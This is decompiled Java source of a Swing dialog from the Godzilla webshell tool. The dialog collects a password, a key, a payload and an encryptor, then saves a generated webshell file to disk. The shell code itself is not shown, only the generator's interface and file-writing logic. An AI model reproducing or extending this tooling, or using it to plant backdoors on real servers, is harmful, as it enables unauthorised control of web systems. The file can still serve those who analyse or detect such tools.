/*     */ package core.ui.component.dialog;
/*     */ 
/*     */ import core.ApplicationContext;
/*     */ import core.EasyI18N;
/*     */ import core.imp.Cryption;
/*     */ import core.ui.MainActivity;
/*     */ import core.ui.component.GBC;
/*     */ import java.awt.Component;
/*     */ import java.awt.Container;
/*     */ import java.awt.Frame;
/*     */ import java.awt.GridBagLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.io.File;
/*     */ import java.io.FileOutputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JDialog;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ 
/*     */ 
/*     */ public class GenerateShellLoder
/*     */   extends JDialog
/*     */ {
/*     */   private final JLabel passwordLabel;
/*     */   private final JLabel secretKeyLabel;
/*     */   private final JLabel cryptionLabel;
/*     */   private final JLabel payloadLabel;
/*     */   private final JTextField passwordTextField;
/*     */   private final JTextField secretKeyTextField;
/*     */   private final JComboBox<String> cryptionComboBox;
/*     */   private final JComboBox<String> payloadComboBox;
/*     */   private final JButton generateButton;
/*     */   private final JButton cancelButton;
/*     */   
/*     */   public GenerateShellLoder() {
/*  41 */     super((Frame)MainActivity.getFrame(), "GenerateShell", true);
/*     */     
/*  43 */     setLayout(new GridBagLayout());
/*     */     
/*  45 */     Container c = getContentPane();
/*     */     
/*  47 */     GBC gbcLPassword = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
/*  48 */     GBC gbcPassword = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
/*  49 */     GBC gbcLSecretKey = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
/*  50 */     GBC gbcSecretKey = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
/*  51 */     GBC gbcLPayload = (new GBC(0, 2)).setInsets(5, -40, 0, 0);
/*  52 */     GBC gbcPayload = (new GBC(1, 2, 3, 1)).setInsets(5, 20, 0, 0);
/*  53 */     GBC gbcLCryption = (new GBC(0, 3)).setInsets(5, -40, 0, 0);
/*  54 */     GBC gbcCryption = (new GBC(1, 3, 3, 1)).setInsets(5, 20, 0, 0);
/*  55 */     GBC gbcGenerate = (new GBC(2, 4)).setInsets(5, -40, 0, 0);
/*  56 */     GBC gbcCancel = (new GBC(1, 4, 3, 1)).setInsets(5, 20, 0, 0);
/*     */     
/*  58 */     this.passwordLabel = new JLabel("密码");
/*  59 */     this.secretKeyLabel = new JLabel("密钥");
/*  60 */     this.payloadLabel = new JLabel("有效载荷");
/*  61 */     this.cryptionLabel = new JLabel("加密器");
/*  62 */     this.passwordTextField = new JTextField(16);
/*  63 */     this.secretKeyTextField = new JTextField(16);
/*  64 */     this.payloadComboBox = new JComboBox<>();
/*  65 */     this.cryptionComboBox = new JComboBox<>();
/*  66 */     this.generateButton = new JButton("生成");
/*  67 */     this.cancelButton = new JButton("取消");
/*     */     
/*  69 */     this.passwordTextField.setText("pass");
/*  70 */     this.secretKeyTextField.setText("key");
/*     */     
/*  72 */     c.add(this.passwordLabel, gbcLPassword);
/*  73 */     c.add(this.passwordTextField, gbcPassword);
/*  74 */     c.add(this.secretKeyLabel, gbcLSecretKey);
/*  75 */     c.add(this.secretKeyTextField, gbcSecretKey);
/*  76 */     c.add(this.payloadLabel, gbcLPayload);
/*  77 */     c.add(this.payloadComboBox, gbcPayload);
/*  78 */     c.add(this.cryptionLabel, gbcLCryption);
/*  79 */     c.add(this.cryptionComboBox, gbcCryption);
/*  80 */     c.add(this.generateButton, gbcGenerate);
/*  81 */     c.add(this.cancelButton, gbcCancel);
/*     */     
/*  83 */     addToComboBox(this.payloadComboBox, ApplicationContext.getAllPayload());
/*     */     
/*  85 */     this.payloadComboBox.addActionListener(new ActionListener()
/*     */         {
/*     */           public void actionPerformed(ActionEvent paramActionEvent)
/*     */           {
/*  89 */             String seleteItemString = (String)GenerateShellLoder.this.payloadComboBox.getSelectedItem();
/*  90 */             GenerateShellLoder.this.cryptionComboBox.removeAllItems();
/*  91 */             GenerateShellLoder.this.addToComboBox(GenerateShellLoder.this.cryptionComboBox, ApplicationContext.getAllCryption(seleteItemString));
/*     */           }
/*     */         });
/*     */     
/*  95 */     automaticBindClick.bindJButtonClick(this, this);
/*  96 */     functions.fireActionEventByJComboBox(this.payloadComboBox);
/*  97 */     functions.setWindowSize(this, 530, 250);
/*  98 */     setLocationRelativeTo((Component)MainActivity.getFrame());
/*  99 */     setDefaultCloseOperation(2);
/* 100 */     EasyI18N.installObject(this);
/* 101 */     setVisible(true);
/*     */   }
/*     */ 
/*     */   
/*     */   private void generateButtonClick(ActionEvent actionEvent) {
/* 106 */     String password = this.passwordTextField.getText();
/* 107 */     String secretKey = this.secretKeyTextField.getText();
/* 108 */     if (password != null && secretKey != null && password.trim().length() > 0 && secretKey.trim().length() > 0) {
/* 109 */       if (this.payloadComboBox.getSelectedItem() != null && this.cryptionComboBox.getSelectedItem() != null) {
/* 110 */         String selectedPayload = (String)this.payloadComboBox.getSelectedItem();
/* 111 */         String selectedCryption = (String)this.cryptionComboBox.getSelectedItem();
/* 112 */         Cryption cryption = ApplicationContext.getCryption(selectedPayload, selectedCryption);
/* 113 */         byte[] data = cryption.generate(password, secretKey);
/* 114 */         if (data != null) {
/* 115 */           GFileChooser chooser = new GFileChooser();
/* 116 */           chooser.setFileSelectionMode(0);
/* 117 */           boolean flag = (0 == chooser.showDialog(new JLabel(), "选择"));
/* 118 */           File selectdFile = chooser.getSelectedFile();
/* 119 */           if (flag && selectdFile != null) {
/*     */             try {
/* 121 */               FileOutputStream fileOutputStream = new FileOutputStream(selectdFile);
/* 122 */               fileOutputStream.write(data);
/* 123 */               fileOutputStream.close();
/* 124 */               GOptionPane.showMessageDialog(this, "success! save file to -> " + selectdFile.getAbsolutePath(), "提示", 1);
/* 125 */               dispose();
/* 126 */             } catch (Exception e) {
/* 127 */               Log.error(e);
/*     */             } 
/*     */           } else {
/* 130 */             Log.log("用户取消选择....", new Object[0]);
/*     */           } 
/*     */         } else {
/* 133 */           GOptionPane.showMessageDialog(this, "加密器在生成时返回空", "提示", 2);
/*     */         } 
/*     */       } else {
/* 136 */         GOptionPane.showMessageDialog(this, "payload 或  cryption 没有选中!", "提示", 2);
/*     */       } 
/*     */     } else {
/* 139 */       GOptionPane.showMessageDialog(this, "password 或\t secretKey  是空的!", "提示", 2);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   private void cancelButtonClick(ActionEvent actionEvent) {
/* 145 */     dispose();
/*     */   }
/*     */   
/*     */   private void addToComboBox(JComboBox<String> comboBox, String[] data) {
/* 149 */     for (int i = 0; i < data.length; i++)
/* 150 */       comboBox.addItem(data[i]); 
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\cor\\ui\component\dialog\GenerateShellLoder.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */